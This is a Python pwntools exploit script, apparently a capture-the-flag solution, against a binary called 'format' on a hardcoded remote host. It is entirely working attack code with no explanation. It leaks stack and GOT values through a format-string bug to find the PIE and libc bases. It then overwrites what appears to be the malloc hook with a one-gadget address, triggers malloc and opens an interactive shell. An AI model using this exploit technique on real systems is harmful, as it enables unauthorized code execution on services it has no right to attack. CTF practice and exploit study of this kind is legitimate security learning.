#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('format')

host = args.HOST or '209.97.187.76'
port = int(args.PORT or 31555)
if not args.REMOTE:
    libc = exe.libc
else:
    libc = ELF('./libc_2.27.so')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *main+0x49
continue
'''.format(**locals())

# -- Exploit goes here --

p = start()

def send_fmt(payload):
    p.sendline(payload)


payload = ""
for i in range(80):
    payload += f"%{str(i)}$lx "

send_fmt(bytes(payload,'utf-8'))

leak = p.recvline().split(b" ")
exe.address = int(leak[41], 16) - 0x12b3

log.info(f"PIE base: {hex(exe.address)}")

log.info(f"printf GOT @ {hex(exe.got['printf'])}")

payload = b"%7$s".ljust(8, b'\x00') + p64(exe.got['printf']) 
send_fmt(payload)
printf_leak = u64(p.recv(1024).ljust(8,b'\x00'))
log.info(f"libc printf @ {hex(printf_leak)}")

if not args.REMOTE:
    libc.address = printf_leak - 0x05fd90
else:
    libc.address = printf_leak - 0x064e80 
log.info(f"libc base @ {hex(libc.address)}")

writes = {
    libc.address + 0x3ebc30: libc.address + 0x4f322
}

payload = fmtstr_payload(6, writes)
p.sendline(payload)
p.recv(1024)

p.sendline(b"%100000c")

p.interactive()
